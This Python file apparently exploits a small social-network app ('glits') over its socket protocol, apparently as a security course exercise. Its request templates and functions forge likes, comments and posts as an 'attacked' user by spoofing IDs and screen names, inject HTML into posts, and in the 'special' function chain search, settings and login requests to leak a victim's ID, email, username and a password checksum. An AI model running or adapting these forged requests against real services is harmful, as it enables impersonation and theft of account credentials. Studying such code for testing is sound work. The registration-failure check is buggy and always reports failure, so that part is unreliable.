import random
import communication
from datetime import datetime, timedelta

MID, SN, AV, DS, PR, ID, UN, PW, GN, ML = '-1', 0, 1, 2, 3, 4, 5, 6, 7, 8

sockets, users, requests, glits_id = {}, {}, {}, {'primary': [], 'attacked': []}

commands = {100: '100#{{gli&&er}}{{"user_name":"{}","password":"{}","enable_push_notifications":true}}##',
            150: '150#{{gli&&er}}{{"registration_code":"{}","user":{{"screen_name":"{}","avatar":"{}","description":"{}","privacy":"{}","id":{},"user_name":"{}","password":"{}","gender":"{}","mail":"{}"}}}}##',
            300: '300#{{gli&&er}}{{"search_entry":"{}","search_type":"SIMPLE"}}##',
            350: '350#{{gli&&er}}{{"screen_name":"{}","avatar":"{}","description":"{}","privacy":"{}","id":{},"user_name":"{}","password":"{}","gender":"{}","mail":"{}"}}##',
            550: '550#{{gli&&er}}{{"feed_owner_id":{},"publisher_id":{},"publisher_screen_name":"{}","publisher_avatar":"{}","background_color":"{}","date":"{}T{}Z","content":"{}","font_color":"{}","id":{}}}##',
            650: '650#{{gli&&er}}{{"glit_id":{},"user_id":{},"user_screen_name":"{}","id":{},"content":"{}","date":"{}T{}Z"}}##',
            710: '710#{{gli&&er}}{{"glit_id":{},"user_id":{},"user_screen_name":"{}","id":{}}}##',
            720: '720#{{gli&&er}}{}##',
            750: '750#{{gli&&er}}{{"user_id":{},"user_screen_name":"{}","glit_id":{}}}##',
            760: '760#{{gli&&er}}{}##'}


def set_sockets_and_users(sockets_dictionary, users_dictionary):
    global sockets, users, requests
    sockets, users = sockets_dictionary, users_dictionary
    requests = {

        '11': {}, '12': {'user_type': 'attacked'}, '13': {'user_screen_name': 'lor'}, '14': {},
        '15': {'socket': sockets['attacked'], 'user_type': 'attacked',
               'user_id': users['attacked'][ID], 'user_screen_name': users['attacked'][SN]},
        '16': {},

        '21': {}, '22': {'user_type': 'attacked'}, '23': {'user_screen_name': 'lor'}, '24': {'content': ''},
        '25': {'content': 'lorem_ipsum' * 13}, '26': {'days_delta': -365}, '27': {'days_delta': 365}, '28': {'content': '<h1>lorem_ipsum</h1>'}, '29': {},

        '31': {}, '32': {'user_type': 'attacked'}, '33': {'user_screen_name': 'lor'}, '34': {},
        '35': {'socket': sockets['attacked'], 'user_type': 'attacked',
               'user_id': users['attacked'][ID], 'user_screen_name': users['attacked'][SN]},
        '36': {},

        '41': {'feed_owner_id': users['attacked'][ID]}, '42': {'feed_owner_id': users['attacked'][ID], 'publisher_screen_name': 'lor'}, '43': {'content': ''},
        '44': {'content': 'g' * 141}, '45': {'days_delta': -365}, '46': {'days_delta': 365}, '47': {'content': '<h1>lorem_ipsum</h1>'},
        '48': {}, '49': {'font_color': 'white'}, '410': {'background_color': 'Blue'},

        '51': {'registration_code': '1111'}, '52': {'mail': ''}, '53': {'screen_name': 'lor'}, '54': {},

        '61': {'search_entry': ''}, '62': {'search_entry': users['attacked'][SN]},

        '71': {'screen_name': 'lor'}, '72': {},

        '81': {}

    }

    publish_gilt(None)
    publish_gilt(None, sockets['attacked'], users['attacked'][ID], users['attacked'][ID], users['attacked'][SN], users['attacked'][AV])


def exploit_weakness(choice):
    inputs_list = [like, comment, wow, publish_gilt, register, search, update_settings, special]
    return inputs_list[choice[0] - 1](choice[1], **requests[str(choice[0]) + str(choice[1])])


def like(mode, socket=None, user_type='primary', user_id=None, user_screen_name=None):
    if socket is None: socket = sockets['primary']
    if user_id is None: user_id = users['primary'][ID]
    if user_screen_name is None: user_screen_name = users['primary'][SN]

    message = commands[710].format(choose_glit(mode, user_type), user_id, user_screen_name, MID)
    response = communication.send_and_receive(socket, message)

    if mode == 4:
        return 'Likes published successfully!\n{}{}'.format(response, communication.send_and_receive(socket, message))
    if mode == 5:
        return 'Unlike published successfully!\n{}'.format(communication.send_and_receive(sockets['primary'], commands[720].format(response[response.find(',"id"') + 6: response.find(',"date"')])))
    if mode == 6:
        return 'Glit ID: {}.\nFrom like response: {}'.format(response[response.find('glit_id') + 9: response.find(',')], response)
    return 'Like published successfully!\n{}'.format(response)


def comment(mode, socket=None, user_type='primary', user_id=None, user_screen_name=None, days_delta=0, content='hi'):
    if socket is None: socket = sockets['primary']
    if user_id is None: user_id = users['primary'][ID]
    if user_screen_name is None: user_screen_name = users['primary'][SN]

    date, time = str(datetime.now() + timedelta(days=days_delta)).split(' ')
    response = communication.send_and_receive(socket, commands[650].format(choose_glit(mode, user_type), user_id, user_screen_name, MID, content, date, time))

    if "Comment published failed" in response:
        return 'Comment publish failed!\n{}'.format(response)
    if mode == 9:
        return 'Glit ID: {}.\nFrom comment response: {}'.format(response[response.find('glit_id') + 9: response.find(',')], response)
    return 'Comment published successfully!\n{}'.format(response)


def wow(mode, socket=None, user_type='primary', user_id=None, user_screen_name=None):
    if socket is None: socket = sockets['primary']
    if user_id is None: user_id = users['primary'][ID]
    if user_screen_name is None: user_screen_name = users['primary'][SN]

    message = commands[750].format(user_id, user_screen_name, choose_glit(mode, user_type))
    response = communication.send_and_receive(socket, message)

    if mode == 4:
        return 'Wows published successfully!\n{}{}'.format(response, communication.send_and_receive(socket, message))
    if mode == 5:
        return 'Unwow published successfully!\n{}'.format(communication.send_and_receive(sockets['primary'], commands[760].format(response[response.find(',"id"') + 6: response.find(',"date"')])))
    if mode == 6:
        return 'Glit ID: {}.\nFrom wow response: {}'.format(response[response.find('glit_id') + 9: response.find(',')], response)
    return 'Wow published successfully!\n{}'.format(response)


def publish_gilt(mode, socket=None, feed_owner_id=None, publisher_id=None, publisher_screen_name=None, avatar=None, background_color='OrangeRed', days_delta=0, content='lorem_ipsum', font_color='black'):
    global glits_id

    if socket is None: socket = sockets['primary']
    if feed_owner_id is None: feed_owner_id = users['primary'][ID]
    if publisher_id is None: publisher_id = users['primary'][ID]
    if publisher_screen_name is None: publisher_screen_name = users['primary'][SN]
    if avatar is None: avatar = users['primary'][AV]

    # Rand an avatar:
    if mode == 8:
        num = users['primary'][AV][2]
        while num == users['primary'][AV][2]:
            num = random.randint(1, 8)
        avatar = 'im' + str(num)

    date, time = str(datetime.now() + timedelta(days=days_delta)).split(' ')
    response = communication.send_and_receive(socket, commands[550].format(feed_owner_id, publisher_id, publisher_screen_name, avatar, background_color, date, time, content, font_color, MID))

    if "Post Glit error" in response:
        return 'Glit Post failed!\n{}'.format(response)

    if publisher_id in users['primary']:
        glits_id['primary'] += [response[response.find('"id"') + 5: -4]]
    else:
        glits_id['attacked'] += [response[response.find('"id"') + 5: -4]]

    return 'Glit post successfully!\n{}'.format(response)


def register(mode, registration_code='11111', screen_name='lorem_ipsum', mail='lorem_ipsum@lorem.ipsum'):
    username = input('\nPlease enter a username: ')

    if mode == 4:
        while len(username) >= 5:
            username = input('Username should be less than 5 characters!\nPlease enter a user name: ')

    response = communication.send_and_receive(sockets['general'], commands[150].format(registration_code, screen_name, 'im4', 'lorem_ipsum', 'Public', MID, username, input('Please enter a password: '), 'Male', mail))

    if 'Registration error' or 'Illegal user registration' in response:
        return 'Registration failed!\n{}'.format(response)
    return 'Registration succeeded!\n{}'.format(response)


def search(mode, search_entry=None):
    response = communication.send_and_receive(sockets['primary'], commands[300].format(search_entry))

    if mode == 2:
        return 'User\'s ID: {}, User\'s Mail: {}.\nFrom search response: {}'.format(response[response.find('"id"') + 5: response.find(',"mail"')], response[response.find('"mail"') + 8: response.find('"},')], response)
    return 'Successful search!\n{}'.format(response)


def update_settings(mode, screen_name=None, user_id=None):
    if screen_name is None: screen_name = users['primary'][SN]
    if user_id is None: user_id = users['primary'][ID]

    if mode == 2:
        user_id = input('\nPlease enter an ID: ')
        while True:
            try:
                if int(user_id) == users['primary'][ID]:
                    user_id = input('Wrong choice!\nPlease enter an ID: ')
                else:
                    break
            except ValueError:
                user_id = input('Wrong choice!\nPlease enter an ID: ')

    response = communication.send_and_receive(sockets['primary'], commands[350].format(screen_name, users['primary'][AV], users['primary'][DS], users['primary'][PR], user_id, users['primary'][UN], users['primary'][PW], users['primary'][GN], users['primary'][ML]))

    if "Setting update error" in response:
        return 'Setting update failed!\n{}'.format(response)
    if mode == 2:
        return 'Username: {}.\nFrom settings response: {}'.format(response[response.find('username') + 10: response.find('{')], response)
    return 'Setting update succeeded!\n{}'.format(response)


def special(mode):
    screen_name = input('\nPlease enter a screen name: ')
    response = search(screen_name)

    if len((response[response.find('}') + 1: response.find('##')])) == 2:
        return 'No user named "{}".'.format(screen_name)

    user_id = response[response.find('"id"') + 5: response.find(',"mail"')]  # Finding the ID (Information Disclosure)
    response = update_settings(None, users['primary'][SN], user_id)

    username = response[response.find('username') + 10: response.find('{')]  # Finding the username (Information Disclosure)
    response = communication.send_and_receive(sockets['general'], commands[100].format(username, 'lorem_ipsum'))

    password_checksum = int(response[response.find('checksum') + 10: response.find('{')]) - sum(ord(char) for char in username)  # Finding the password checksum (Information Disclosure)
    return 'Username: {}, Password Checksum: {}.\n'.format(username, password_checksum)


def choose_glit(mode, user_type='primary'):
    if mode == 1:
        return '9999999999999'

    glit = input('\nGlits: {}.\nPlease choose a glit: '.format(', '.join(glits_id[user_type])))
    while glit not in glits_id[user_type]:
        glit = input('Wrong choice!\nPlease choose a glit: '.format(glits_id[user_type]))
    return glit
